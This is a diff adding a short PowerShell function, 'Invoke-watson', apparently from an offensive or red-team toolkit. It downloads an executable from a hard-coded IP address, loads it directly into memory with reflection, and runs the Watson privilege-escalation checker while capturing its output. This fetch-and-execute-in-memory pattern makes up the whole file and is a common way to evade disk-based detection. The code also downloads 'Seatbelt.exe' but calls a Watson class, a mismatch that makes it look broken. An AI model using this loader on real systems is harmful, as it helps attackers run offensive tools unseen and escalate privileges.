@@ -1,0 +1,16 @@
+function Invoke-watson
+{
+    $base64binary= (New-Object System.Net.WebClient).DownloadData("http://192.168.0.102/Seatbelt.exe")
+    
+    $RAS = [System.Reflection.Assembly]::Load($base64binary)
+
+    $OldConsoleOut = [Console]::Out
+    $StringWriter = New-Object IO.StringWriter
+    [Console]::SetOut($StringWriter)
+
+    [Watson.Program]::Main("")
+
+    [Console]::SetOut($OldConsoleOut)
+    $Results = $StringWriter.ToString()
+    $Results
+}
